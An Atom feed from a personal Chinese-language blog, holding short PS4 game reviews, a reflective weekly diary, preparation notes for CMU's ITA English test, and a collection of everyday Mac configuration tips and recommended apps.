<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[小土刀]]></title>
  <subtitle><![CDATA[Agony is my triumph]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://wdxtub.com/"/>
  <updated>2016-02-20T23:37:29.000Z</updated>
  <id>http://wdxtub.com/</id>
  
  <author>
    <name><![CDATA[wdxtub]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[PS4 游戏简评]]></title>
    <link href="http://wdxtub.com/2016/02/20/ps4-game-short-review/"/>
    <id>http://wdxtub.com/2016/02/20/ps4-game-short-review/</id>
    <published>2016-02-20T21:23:49.000Z</published>
    <updated>2016-02-20T23:37:29.000Z</updated>
    <content type="html"><![CDATA[<p>这个系列主要是记录一下自己玩过的众多 PS4 游戏，因为时间和篇幅所限，每个游戏可能只会用几句话简单评测，当然，某些我觉得值得单独拉出来评测的，还是会专门进行介绍的。</p>
<a id="more"></a>
<hr>
<h2 id="u5199_u5728_u524D_u9762"><a href="#u5199_u5728_u524D_u9762" class="headerlink" title="写在前面"></a>写在前面</h2><ul>
<li>入选标准纯主观</li>
<li>按自然顺序排列（就是瞎排，没有类别和时间顺序）</li>
<li>评测标准纯主观，具体评测角度看心情</li>
<li>一分钱广告费没有拿，没有利益相关</li>
<li>部分内容可能因为记忆偏差或者游戏更新而不一致，不要在意这些细节</li>
<li>先写列表，然后慢慢补充</li>
<li>想到了再多加几条显得既随性又专业</li>
</ul>
<h2 id="Amplitude"><a href="#Amplitude" class="headerlink" title="Amplitude"></a>Amplitude</h2><p>音乐游戏，除了按键之外，还需要利用方向键切换不同的音轨，总体来说非常不错。</p>
<ul>
<li>大小：2.5 GB</li>
<li>开发商：Harmonix Music Systems, Inc</li>
<li>价格：$19.99</li>
<li>发售日：2016.1.5</li>
</ul>
<p><img src="/images/14560053059106.jpg" alt=""></p>
<p>不过键位设计很奇怪，一共三个按键，分别是 L1, R1, R2，因为 R1 和 R2 的键程不一样，所以按起来怪怪的，还是有点不习惯。切换音轨需要大量的提前量预判，而且很容易在最后一个 miss，一 miss 整个 section 的分数都没有，无他，唯手熟耳。</p>
<p>画面比较科幻，看久了眼睛疼，而且音乐偏电子音乐，我不算特别喜欢。不过作为难得的音乐节拍游戏，还是值得一玩的，多人合作的话应该挺刺激。</p>
<h2 id="ARSLAN_3A_The_WARRIORS_OF_LEGEND"><a href="#ARSLAN_3A_The_WARRIORS_OF_LEGEND" class="headerlink" title="ARSLAN: The WARRIORS OF LEGEND"></a>ARSLAN: The WARRIORS OF LEGEND</h2><p>光荣开始换着花样出割草游戏了，不过这次的动画画风还是不错的。</p>
<ul>
<li>大小：15.5 GB</li>
<li>开发商：Tecmo KOEI America</li>
<li>价格：$59.99</li>
<li>发售日：2016.2.9</li>
</ul>
<p><img src="/images/14560059636741.jpg" alt=""></p>
<p>整体玩起来也没啥特别大的区别，连招还有效果都比较趋同。换句话说，我还不如玩真三呢，至少还有点代入感。这么换个模型就出来骗 60 刀，光荣也是很黑啊。不是很推荐购入，当然铁粉另说。</p>
<h2 id="Blacklight_3A_Retribution"><a href="#Blacklight_3A_Retribution" class="headerlink" title="Blacklight: Retribution"></a>Blacklight: Retribution</h2><p>标准的美式在线多人射击对战游戏，重点在于免费，不过也使得玩家的技术差距比较大，新手很容易直接被打哭（教程也不是特别友好）</p>
<ul>
<li>大小：4.6 GB</li>
<li>开发商：Hardsuit Labs</li>
<li>价格：FREE</li>
<li>发售日：2013.11.15</li>
</ul>
<p><img src="/images/14560071072422.jpg" alt=""></p>
<p>13 年的老游戏了，比较简单粗暴的对战射击，估计是预计玩家都有基本的经验了，所以学习曲线非常陡峭，而且因为是免费游戏，没啥门槛，所以很容易出现挂机的，非常影响体验。不过我一直对射击对战类游戏非常苦手，还是比较喜欢合作或者剧情向的。</p>
<h2 id="RAINBOW_MOON"><a href="#RAINBOW_MOON" class="headerlink" title="RAINBOW MOON"></a>RAINBOW MOON</h2><p>丑到哭的回合制 RPG，我玩了五分钟就表示阵亡坚持不下去，真的是太复古了。</p>
<ul>
<li>大小：1.6 GB</li>
<li>开发商：EastAsiaSoft</li>
<li>价格：$14.99</li>
<li>发售日：2016.2.16</li>
</ul>
<p><img src="/images/14560076052824.jpg" alt=""></p>
<p>战棋走格子 + 回合制 RPG，人设丑出新高度，字体和界面的整体感觉也很奇怪，让人不大舒服。总而言之，不推荐。</p>
<h2 id="Gems_of_War"><a href="#Gems_of_War" class="headerlink" title="Gems of War"></a>Gems of War</h2><p>三消 + 卡牌 + 回合 = Gems of War，个人感觉有点不伦不类。</p>
<ul>
<li>大小：1.6 GB</li>
<li>开发商：505 Games</li>
<li>价格：FREE</li>
<li>发售日：2015.11.13</li>
</ul>
<p><img src="/images/14560078541208.jpg" alt=""></p>
<p>不同颜色代表不同的能力，然后通过消除三个或以上对应元素来进行攻击或者属性增强。就我的感觉来说，要么直接神魔之塔不要太多策略，要么直接炉石传说好好收集卡牌，结合起来不是不可以，但是回合制就有点怪怪了。一次消除四个元素有额外的一轮操作并且还有附加效果，不过因为是回合制，基本上如果对手会玩，是很难有机会四个的。</p>
<p>另外，手柄玩这类点击类游戏，其实不是特别顺手。不过总体来说算是不错的休闲游戏</p>
<h2 id="GUNS_UP_21"><a href="#GUNS_UP_21" class="headerlink" title="GUNS UP!"></a>GUNS UP!</h2><p>索尼自己出的休闲即使策略小游戏，画风可爱，操作也很简单明了，不算给第一方丢脸。</p>
<ul>
<li>大小：867 MB</li>
<li>开发商：Sony Computer Entertainment America</li>
<li>价格：FREE</li>
<li>发售日：2015.12.5</li>
</ul>
<p><img src="/images/14560083740117.jpg" alt=""></p>
<p>简单来说就是控制进攻方或者防守方，用简单的操作完成指定任务，游戏模式还是很丰富的，整体的艺术风格也很和谐，虽然是战场，但是更多的是欢乐。基本上玩家要做的就是选择生产什么兵种，以及确定轰炸地点之类的技能，算是塔防类型的变体。</p>
<p>反正免费，干嘛不玩一玩呢？另外难得容量没超过 1G 但是画面也不错，我就好奇其他的『小游戏』到底放了啥在游戏里面。</p>
<h2 id="Tearaway_Unfolded"><a href="#Tearaway_Unfolded" class="headerlink" title="Tearaway Unfolded"></a>Tearaway Unfolded</h2><p>索尼大法继小小大星球用布娃娃之后，这次直接用纸片弄出了一个新世界，而且还是全 3D 的！百分百值得入手！</p>
<ul>
<li>大小：6.8 MB</li>
<li>开发商：Sony Computer Entertainment America</li>
<li>价格：$19.99</li>
<li>发售日：2015.9.8</li>
</ul>
<p><img src="/images/14560111893739.jpg" alt=""></p>
<p>无论是对手柄各种功能的应用（触摸板，声音，动作），还是整个游戏自由开放且独树一帜的艺术风格，都远远甩开 XBOX ONE 第一方游戏几条街，更可怕的是，这还只是一个不到 20 刀的『小品』游戏。</p>
<p>从小小大星球开始索尼就有点接过任天堂衣钵的感觉，本作一出，任你马里奥再强，耐不住索尼大法一波又一波艺术+创意的攻势。</p>
<p>会专门为本作写一篇测评，不然没办法表达『索尼大法好』这一题中之义。</p>
<h2 id="Bloodborne"><a href="#Bloodborne" class="headerlink" title="Bloodborne"></a>Bloodborne</h2><h2 id="DEAD_OR_ALIVE_5_Last_Round"><a href="#DEAD_OR_ALIVE_5_Last_Round" class="headerlink" title="DEAD OR ALIVE 5 Last Round"></a>DEAD OR ALIVE 5 Last Round</h2><h2 id="Destiny"><a href="#Destiny" class="headerlink" title="Destiny"></a>Destiny</h2><h2 id="Dying_Light"><a href="#Dying_Light" class="headerlink" title="Dying Light"></a>Dying Light</h2><h2 id="Fallout_4"><a href="#Fallout_4" class="headerlink" title="Fallout 4"></a>Fallout 4</h2><h2 id="FIFA_16"><a href="#FIFA_16" class="headerlink" title="FIFA 16"></a>FIFA 16</h2><h2 id="Flower"><a href="#Flower" class="headerlink" title="Flower"></a>Flower</h2><h2 id="Indivisible_Prototype"><a href="#Indivisible_Prototype" class="headerlink" title="Indivisible Prototype"></a>Indivisible Prototype</h2><h2 id="Journey"><a href="#Journey" class="headerlink" title="Journey"></a>Journey</h2><h2 id="LEGO_MARVEL_u2019s_Avengers"><a href="#LEGO_MARVEL_u2019s_Avengers" class="headerlink" title="LEGO MARVEL’s Avengers"></a>LEGO MARVEL’s Avengers</h2><h2 id="Life_Is_Strange"><a href="#Life_Is_Strange" class="headerlink" title="Life Is Strange"></a>Life Is Strange</h2><h2 id="Little_Big_Planet_3"><a href="#Little_Big_Planet_3" class="headerlink" title="Little Big Planet 3"></a>Little Big Planet 3</h2><h2 id="Loadout"><a href="#Loadout" class="headerlink" title="Loadout"></a>Loadout</h2><h2 id="METAL_GEAR_SOLID_V_3A_THE_PHANTOM_PAIN"><a href="#METAL_GEAR_SOLID_V_3A_THE_PHANTOM_PAIN" class="headerlink" title="METAL GEAR SOLID V: THE PHANTOM PAIN"></a>METAL GEAR SOLID V: THE PHANTOM PAIN</h2><h2 id="NARUTO_SHIPPUDEN_3A_Ultimate_Ninja_STORM_4"><a href="#NARUTO_SHIPPUDEN_3A_Ultimate_Ninja_STORM_4" class="headerlink" title="NARUTO SHIPPUDEN: Ultimate Ninja STORM 4"></a>NARUTO SHIPPUDEN: Ultimate Ninja STORM 4</h2><h2 id="NBA_LIVE_16"><a href="#NBA_LIVE_16" class="headerlink" title="NBA LIVE 16"></a>NBA LIVE 16</h2><h2 id="RESIDENT_EVIL_REVELATIONS_2"><a href="#RESIDENT_EVIL_REVELATIONS_2" class="headerlink" title="RESIDENT EVIL REVELATIONS 2"></a>RESIDENT EVIL REVELATIONS 2</h2><h2 id="The_Crew"><a href="#The_Crew" class="headerlink" title="The Crew"></a>The Crew</h2><h2 id="Toukiden_3A_Kiwami"><a href="#Toukiden_3A_Kiwami" class="headerlink" title="Toukiden: Kiwami"></a>Toukiden: Kiwami</h2><h2 id="Uncharted_3A_The_Nathan_Drake_Collection"><a href="#Uncharted_3A_The_Nathan_Drake_Collection" class="headerlink" title="Uncharted: The Nathan Drake Collection"></a>Uncharted: The Nathan Drake Collection</h2><h2 id="Warframe"><a href="#Warframe" class="headerlink" title="Warframe"></a>Warframe</h2><h2 id="Farcry_4"><a href="#Farcry_4" class="headerlink" title="Farcry 4"></a>Farcry 4</h2><h2 id="The_Last_of_US"><a href="#The_Last_of_US" class="headerlink" title="The Last of US"></a>The Last of US</h2>]]></content>
    <summary type="html">
    <![CDATA[<p>这个系列主要是记录一下自己玩过的众多 PS4 游戏，因为时间和篇幅所限，每个游戏可能只会用几句话简单评测，当然，某些我觉得值得单独拉出来评测的，还是会专门进行介绍的。</p>]]>
    
    </summary>
    
      <category term="PS4" scheme="http://wdxtub.com/tags/PS4/"/>
    
      <category term="游戏" scheme="http://wdxtub.com/tags/%E6%B8%B8%E6%88%8F/"/>
    
      <category term="评测" scheme="http://wdxtub.com/tags/%E8%AF%84%E6%B5%8B/"/>
    
      <category term="Game" scheme="http://wdxtub.com/categories/Game/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[第六周 - 曾经的你]]></title>
    <link href="http://wdxtub.com/2016/02/19/used-to-be/"/>
    <id>http://wdxtub.com/2016/02/19/used-to-be/</id>
    <published>2016-02-20T03:13:43.000Z</published>
    <updated>2016-02-20T04:08:29.000Z</updated>
    <content type="html"><![CDATA[<p>曾梦想仗剑走天涯，看一看世界的繁华。走在勇往直前的路上，有难过也有精彩。</p>
<a id="more"></a>
<hr>
<p>阿来写过一本书，叫《尘埃落定》，说的是一个傻子少爷，用其特有的观察世界的角度，穿透愚蠢与欲望，一针见血刺出事物的本质，也见证了土司制度的衰亡。这一周，我也算是『随性』而『傻』地做出了『尘埃落定』的决定：买好回国机票，切断所有后路，大踏步继续往前。</p>
<p>一直觉得，年轻人不要用所谓『大家觉得好』的路，去麻痹和替代自己对未来的思考。喜欢什么，讨厌什么，擅长什么，拙于什么，都应该在不同的体验中增进对自己的了解。对我来说，没有家庭的负担，甚至也没有太多儿女情长的羁绊，所以更希望去做自己真正想要去做的事情。</p>
<p>回顾自己一路走来的旅程，更多的决定是随性的，或者说是冥冥之中已经决定的，从论文的题目，到学业的选择，从租房的变动，到工作的确定，都是和自己的兴趣爱好有关。一直以来都是那种一旦有个念头就打不起精神做其他事情的人，恐怕全情投入背水一战才是最好的选择。</p>
<p>前段时间有些迷茫，毕竟身处大环境中，很容易被身边人的焦虑所『感染』，开始去追逐『大家觉得好』的事情，用『大家觉得对』的评判标准来衡量自己。后来想清楚了才意识到，既然一直以来我选择的就是不同的路，不同的标准，那么唯一的标尺，就是这件事情我喜不喜欢，我愿不愿意去做，而不是那些『别人觉得好大家都应该去做』的事情。</p>
<p>即使有这么一条路，宽敞平坦，直达所谓『终点』，我也并不愿意走。目的地不明确，又可能是坎坷的路，我反而愿意去试试，毕竟，每一步都是经过自己的判断迈出的，走出去才无怨无悔。而且话说回来，到底那条路更艰难，不去试试怎么知道呢？同样是做火影忍者游戏，玩家很短时间就能意识到谁是用心开发谁是为了赚钱，生活学习工作也是这个道理：不要隐藏自己，努力去做自己真正想做的事情。</p>
<p>随着对课程的适应，基本上进入了比较轻松的阶段，开学前计划的各类事项也在逐步启动。重启翻译计划后，因为对计算机体系的深入理解，很多概念的理解也更加深入了。另外一个好消息是，随着时间的推移，自己的技术博客也逐渐有了一些有价值的互动了，这是我一直想要看到的。既然知道了很多东西中文世界里没人写过，那么我愿意吃点苦流点汗，去做这第一个人（这周的几篇日志应该都是其他地方没有的）。</p>
<p>身处变革的时代，在中国这样一个『启蒙时代』一切未定型的国家，经济政治社会环境道德文化都有太多太多需要改进的地方，有太多太多让年轻人大展宏图的机会，为什么不趁着年轻去闯一闯呢？假如生活终将归于平静，为什么不在万籁俱寂前发出自己的声音呢？</p>
<blockquote>
<p>正义之子面对有悖于常理的世界，会使其天翻地覆</p>
</blockquote>
<p>让我们干了这杯酒，好男儿胸怀像大海。总想起身边走在路上的朋友，有多少正在醒来。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>曾梦想仗剑走天涯，看一看世界的繁华。走在勇往直前的路上，有难过也有精彩。</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="周记" scheme="http://wdxtub.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
      <category term="坚持" scheme="http://wdxtub.com/tags/%E5%9D%9A%E6%8C%81/"/>
    
      <category term="转弯" scheme="http://wdxtub.com/tags/%E8%BD%AC%E5%BC%AF/"/>
    
      <category term="Gossip" scheme="http://wdxtub.com/categories/Gossip/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ITA Testing 相关资料]]></title>
    <link href="http://wdxtub.com/2016/02/19/ita-test/"/>
    <id>http://wdxtub.com/2016/02/19/ita-test/</id>
    <published>2016-02-19T15:06:41.000Z</published>
    <updated>2016-02-19T15:58:35.000Z</updated>
    <content type="html"><![CDATA[<p>这门语言考试是在 CMU 做助教必须要通过的，虽然『据说』比较轻松，但是还是认真准备一下，算是通过研究考试的方式加深对于语言本身的认识。</p>
<a id="more"></a>
<hr>
<p>简单来说，就是所有母语不是英语的助教，都需要通过这么一个测试。主要考察口语交流能力，整个过程有 4 到 5 个评审，测试包含两部分：</p>
<ol>
<li>交流部分，需要讨论自己的学术背景和兴趣</li>
<li>具体选择一个话题来进行正式的解释（大约五分钟），评审会根据内容来问一些问题。</li>
</ol>
<p>主要考察发音、语法、流畅度以及如何去定义一个学术概念，并且解释清楚术语和定义，以及举出相关例子来进行阐述和说明。注意这里的要求不会特别高，所以不用担心，也不会评价专业领域的知识和教学技巧。</p>
<p>会有四个评价等级：</p>
<p>Pass, Restricted I, Restricted II, Not Qualified</p>
<p>这里只贴出前两个等级（毕竟后面两个比较惨）</p>
<p><img src="/images/14558964554346.jpg" alt=""></p>
<p>还有一些具体的技巧，我觉得不仅可以用在 ITA 测试上，对于日常的交流也很有帮助。列举如下：</p>
<ul>
<li>了解你的听众，他们对各个领域有基本的相关知识，但是可能对特定领域没有很深的认识，所以一定要考虑到听众的接收程度</li>
<li>解释清楚那些可能对于普通人来说难以理解的技术名词，不要依赖公式和『科学黑话』</li>
<li>做助教很多时候需要面对没有准备的问题，就是需要测试在这种情况下我们的表现</li>
<li>如果评审给出的主题不合适，需要说清楚为什么不合适，并且找到一个合适的话题，总体来说就是一个交流的过程</li>
<li>因为只有五分钟的时间，所以可能评审会打断你的解释，所以把每一句话当做最后一句话，尽力解释清楚</li>
<li>语速不要太快，注意说话的节奏</li>
<li>和听众多多交流，确保他们听懂</li>
<li>可能的话使用黑板，视觉也是学习很重要的输入</li>
<li>注意使用过渡语言来让听众明白整个介绍的逻辑组织形式</li>
<li>不要紧张，不要紧张，不要紧张</li>
</ul>
<p>基本上是一个考察『硬实力』的测试，正常发挥应该就没有多少问题。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这门语言考试是在 CMU 做助教必须要通过的，虽然『据说』比较轻松，但是还是认真准备一下，算是通过研究考试的方式加深对于语言本身的认识。</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="助教" scheme="http://wdxtub.com/tags/%E5%8A%A9%E6%95%99/"/>
    
      <category term="测试" scheme="http://wdxtub.com/tags/%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Mac 技巧指南]]></title>
    <link href="http://wdxtub.com/2016/02/18/mac-tips/"/>
    <id>http://wdxtub.com/2016/02/18/mac-tips/</id>
    <published>2016-02-19T03:05:09.000Z</published>
    <updated>2016-02-19T03:33:37.000Z</updated>
    <content type="html"><![CDATA[<p>这里主要整理一些一直以来使用 Mac 的技巧以及构建高效开发学习环境的指南。主要是按照个人的使用习惯，所以所用的工具和软件都比较偏写代码一些。</p>
<a id="more"></a>
<hr>
<h2 id="u6280_u5DE7_u7BC7"><a href="#u6280_u5DE7_u7BC7" class="headerlink" title="技巧篇"></a>技巧篇</h2><p>遇到一些疑难杂症，可以试试看。</p>
<h3 id="u5207_u6362_shell"><a href="#u5207_u6362_shell" class="headerlink" title="切换 shell"></a>切换 shell</h3><p>nano 编辑器中</p>
<ul>
<li>ctrl 表示 ^</li>
<li>F3保存，F2退出</li>
</ul>
<p>具体步骤</p>
<ol>
<li><code>sudo nano /etc/shells</code></li>
<li>把 <code>/usr/local/bin/fish</code> 添加进去（这里以添加 fish shell 为例子）</li>
<li><code>chsh -s /usr/local/bin/fish</code> （平时切换只需要用这句即可）</li>
</ol>
<h3 id="u6279_u91CF_u5220_u9664_u6307_u5B9A_u7C7B_u578B_u7684_u6587_u4EF6"><a href="#u6279_u91CF_u5220_u9664_u6307_u5B9A_u7C7B_u578B_u7684_u6587_u4EF6" class="headerlink" title="批量删除指定类型的文件"></a>批量删除指定类型的文件</h3><p>可以使用这条命令</p>
<p><code>find . -name &quot;.Ulysses-Group.plist&quot; -exec rm -Rf {} \;</code></p>
<h3 id="u6E05_u9664_u4E0D_u5FC5_u8981_u7684_u670D_u52A1"><a href="#u6E05_u9664_u4E0D_u5FC5_u8981_u7684_u670D_u52A1" class="headerlink" title="清除不必要的服务"></a>清除不必要的服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">launchctl list 查看服务列表</span><br><span class="line">launchctl remove xxxx 删除xxxxx服务的自启动</span><br></pre></td></tr></table></figure>
<h3 id="u5173_u95ED_Rootless"><a href="#u5173_u95ED_Rootless" class="headerlink" title="关闭 Rootless"></a>关闭 Rootless</h3><p>Rootless 是 OSX 10.11 中为了增强安全性而增加的特性，不过对于开发者来说，不能访问根目录下的某些文件夹实在是很恼人的事情。下面是关闭的方法：</p>
<ul>
<li>开机按住 Command＋R，进入恢复模式，打开 terminal，键入：</li>
<li><code>csrutil disable</code></li>
<li>回车，重新启动即可。</li>
<li>要恢复 rootless ，只需将 disable 改为 enable</li>
</ul>
<h3 id="u91CD_u5EFA_Mail__u7D22_u5F15"><a href="#u91CD_u5EFA_Mail__u7D22_u5F15" class="headerlink" title="重建 Mail 索引"></a>重建 Mail 索引</h3><p>当邮箱出现问题时，您可能会看到提醒信息说“邮件”需要通过重新索引邮件来修复邮箱。在其他时候，您可能想要自己重新索引邮件，例如，使用“主题”、“收件人”或“发件人”搜索邮箱时未返回正确结果时。</p>
<ul>
<li>如果“邮件”已打开，请退出它。</li>
<li>在“User/资源库/Mail/V3/MailData”中，删除任何以“Envelope Index”开头的文件，如 Envelope Index 或 Envelope Index-shm。</li>
<li>默认情况下，您的“资源库”个人文件夹处于隐藏状态。若要显示它，请选取 Finder &gt;“前往文件夹”，然后输入“~/资源库”。</li>
<li>打开“邮件”。</li>
<li>“邮件”将创建新 Envelope Index 文件。此过程可能需要几分钟，取决于“邮件”要重新索引的邮件数量。</li>
</ul>
<h3 id="u6E05_u9664_PRAM"><a href="#u6E05_u9664_PRAM" class="headerlink" title="清除 PRAM"></a>清除 PRAM</h3><p>(只适用于英特尔的苹果电脑)</p>
<p>这个方法不是根本的解决方法，但是可以除去一些不必要的开机设置。因而也节省了时间。方法是：重启你的电脑，同时按下 command + option + p + r 直到听到 3 到 4 声启动铃响之后松手。</p>
<h3 id="u6E05_u9664PMU"><a href="#u6E05_u9664PMU" class="headerlink" title="清除PMU"></a>清除PMU</h3><p>(iMac不适用)</p>
<p>对于Macbook, Macbook Pro用户，方法是：</p>
<ol>
<li>确保Macbook关闭.</li>
<li>去掉电源适配器和电池.</li>
<li>按下电源开关并保持5 秒钟，放开.</li>
<li>接上电源适配器和电池.</li>
<li>打开电源开关.</li>
</ol>
<h3 id="u663E_u793A/_u9690_u85CF__u9690_u85CF_u6587_u4EF6"><a href="#u663E_u793A/_u9690_u85CF__u9690_u85CF_u6587_u4EF6" class="headerlink" title="显示/隐藏 隐藏文件"></a>显示/隐藏 隐藏文件</h3><p>使用下面的命令即可分别测试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool <span class="literal">true</span></span><br><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h3 id="u8FD8_u539F_F1-F12"><a href="#u8FD8_u539F_F1-F12" class="headerlink" title="还原 F1-F12"></a>还原 F1-F12</h3><p>默认情况下，F1-F12 都是特殊功能，比如调节屏幕亮度。而当你需要键入 F1-F12 时（比如在使用 IntelliJ IDEA 的快捷键时），需要同时按住 Fn。这对于开发人员来说是非常不方便的。</p>
<p>把 F1-F12 改成标准功能键：选择 <code>System Preferences</code> &gt; <code>Keyboard</code>，在<code>Keyboard</code>标签页中选中<code>Use all F1, F2, etc. keys as standard function keys</code>。</p>
<h3 id="u5229_u7528_u8BED_u97F3_u529F_u80FD"><a href="#u5229_u7528_u8BED_u97F3_u529F_u80FD" class="headerlink" title="利用语音功能"></a>利用语音功能</h3><p>OS X 自带了语音功能，可以用<code>say</code>命令让 Mac 开口说话：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">say hello</span><br></pre></td></tr></table></figure>
<p>可以和<code>&amp;&amp;</code>或者<code>;</code>配合使用来提示你某任务已经完成：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew update &amp;&amp; brew upgrade &amp;&amp; brew cleanup ; say mission complete</span><br></pre></td></tr></table></figure>
<p>通过命令行来听取发音还是有点麻烦。其实我们几乎可以在任何地方选中单词，然后使用快捷键 <code>⌥+ESC</code> 发音。仅仅需要这样设置一下：选择 <code>System Preferences</code> &gt; <code>Dictation &amp; Speech</code>，在<code>Text to Speech</code>标签页中选中<code>Speak selected text when the key is pressed</code>。</p>
<h3 id="u5728_Finder__u7A97_u53E3_u663E_u793A_u66F4_u591A_u4FE1_u606F"><a href="#u5728_Finder__u7A97_u53E3_u663E_u793A_u66F4_u591A_u4FE1_u606F" class="headerlink" title="在 Finder 窗口显示更多信息"></a>在 Finder 窗口显示更多信息</h3><p>打开任意 Finder 窗口。前往并打开「显示」－「显示路径栏」、「显示」－「显示状态栏」和「显示」－「显示预览」三项。</p>
<p>路径栏通常是从磁盘分区开始的，没改过名字的就叫做「Macintosh HD」，接下来是「用户」，可是路径信息的这两个项目几乎没什么作用，我们需要看的一般都是从个人账户开始后面的路径。下面我们就来尝试删除这两个路径选项：</p>
<p>打开终端，输入以下命令：</p>
<pre><code>defaults write com.apple.finder PathBarRootAtHome -bool TRUE;killall Finder
</code></pre><p>回车后 Finder 会重启一下，改变即可见。</p>
<p>恢复默认：打开终端，输入如下代码并回车就可以恢复原样：</p>
<pre><code>defaults delete com.apple.finder PathBarRootAtHome;killall Finder
</code></pre><h3 id="u8BA9_u6587_u4EF6_u6269_u5C55_u540D_u59CB_u7EC8_u663E_u793A"><a href="#u8BA9_u6587_u4EF6_u6269_u5C55_u540D_u59CB_u7EC8_u663E_u793A" class="headerlink" title="让文件扩展名始终显示"></a>让文件扩展名始终显示</h3><p>当你看到一个文件但是不知道它的格式的时候，会不会困惑？每次都要去简介页面查看文件是 .jpg 还是 .png 是不是很繁琐？哦，还有 CMD－i 快捷键？但是这些都比默认就显示来得慢。</p>
<p>打开 Finder 偏好设置，选中「高级」标签，然后在「始终显示文件扩展名」前面打勾即可。</p>
<h3 id="u4F7F_Finder__u9ED8_u8BA4_u663E_u793A_u81EA_u5B9A_u4E49_u76EE_u5F55"><a href="#u4F7F_Finder__u9ED8_u8BA4_u663E_u793A_u81EA_u5B9A_u4E49_u76EE_u5F55" class="headerlink" title="使 Finder 默认显示自定义目录"></a>使 Finder 默认显示自定义目录</h3><p>「我的所有文件」是一个非常实用的功能。但是这对于那些需要按照目录来显示文件的用户来说，每次都需要进行一次额外的操作才能打开用户目录或者其他文件夹。让我们取消默认显示「我的所有文件」功能：</p>
<p>打开 Finder 偏好设置，选中「通用」标签，然后在「开启新 Finder 窗口时打开」项下选择你喜欢的目录即可。</p>
<h3 id="u5728_u4FA7_u8FB9_u680F_u663E_u793A_u7528_u6237_u76EE_u5F55"><a href="#u5728_u4FA7_u8FB9_u680F_u663E_u793A_u7528_u6237_u76EE_u5F55" class="headerlink" title="在侧边栏显示用户目录"></a>在侧边栏显示用户目录</h3><p>在 Mac 系统中，绝大多数用户文件，例如音乐、照片等都存储在用户目录下，所以在 Finder 侧边栏一直显示用户目录的内容是一个好主意。设置起来同样很简单：</p>
<p>打开 Finder 偏好设置，选中「边栏」标签，然后记得勾选你的用户名。</p>
<h3 id="u5728_Finder__u6807_u9898_u680F_u663E_u793A_u5B8C_u6574_u8DEF_u5F84"><a href="#u5728_Finder__u6807_u9898_u680F_u663E_u793A_u5B8C_u6574_u8DEF_u5F84" class="headerlink" title="在 Finder 标题栏显示完整路径"></a>在 Finder 标题栏显示完整路径</h3><p>众所周知 Finder 是不显示路径的，你进入某个文件夹只会显示当前文件夹的名字而已。虽然你可以通过上文中的方法将路径栏调出来，但是这样也增加了 Finder 窗口的高度，对小屏幕机器尤为不利。那么，让我们更进一步，将 Finder 的完整路径显示在标题栏如何？</p>
<p>打开终端，输入以下命令并回车：</p>
<pre><code>defaults write com.apple.finder _FXShowPosixPathInTitle -bool YES
</code></pre><p>然后把 Finder 窗口关了再打开，你会发现路径栏变样子了：</p>
<p>其实呢，对着路径最左边的小图标点右键，就能快速访问路径中的任意一层：</p>
<p>恢复</p>
<pre><code>defaults write com.apple.finder _FXShowPosixPathInTitle -bool NO
</code></pre><h3 id="u59CB_u7EC8_u663E_u793A_u7528_u6237_u300C_u8D44_u6599_u5E93_u300D"><a href="#u59CB_u7EC8_u663E_u793A_u7528_u6237_u300C_u8D44_u6599_u5E93_u300D" class="headerlink" title="始终显示用户「资料库」"></a>始终显示用户「资料库」</h3><p>用户资料库是用来储存配置文件、缓存和用户数据的目录（路径：~/Library/），由于 OS X 设置了系统文件保护，资料库在 Finder 中被设置为默认不显示。然而，通过终端执行一个简单的命令，就可以让它始终显示了。</p>
<p>打开终端，运行以下命令：</p>
<pre><code>chflags nohidden ~/Library/
</code></pre><p>回车即可。</p>
<h3 id="u663E_u793A_u6587_u4EF6_uFF08_u5939_uFF09_u7684_u4FE1_u606F"><a href="#u663E_u793A_u6587_u4EF6_uFF08_u5939_uFF09_u7684_u4FE1_u606F" class="headerlink" title="显示文件（夹）的信息"></a>显示文件（夹）的信息</h3><p>Finder 可以告诉你一些关于文件和文件夹的非常实用的信息，比如选中的文件夹内有多少个文件、照片的分辨率（这个笔者最喜欢）等等。对于笔者这种重度截图党来说，这几乎是一个「必选」的设置。</p>
<p>在桌面点击鼠标右键，选择「查看显示选项」，选中「显示项目简介」项，现在看看，你的文件、文件夹有什么变化？</p>
<h2 id="u5E94_u7528_u8F6F_u4EF6"><a href="#u5E94_u7528_u8F6F_u4EF6" class="headerlink" title="应用软件"></a>应用软件</h2><p>付费软件：</p>
<ul>
<li>1Password：密码管理；</li>
<li>BetterZip2：解压缩；</li>
<li>Parallels Desktop：虚拟机</li>
<li>CleanMyMac 3：垃圾清理</li>
</ul>
<p>免费软件：</p>
<ul>
<li>Alferd：提高效率的神器</li>
<li>MPlayerX：视频播放器，播放各种格式视频</li>
<li>iTerm2：命令行终端</li>
<li>SiteSucker：网站备份工具</li>
<li>LICEcap：截取GIF动态图</li>
<li>ImageAlpha(Pngyu)：png图片压缩</li>
</ul>
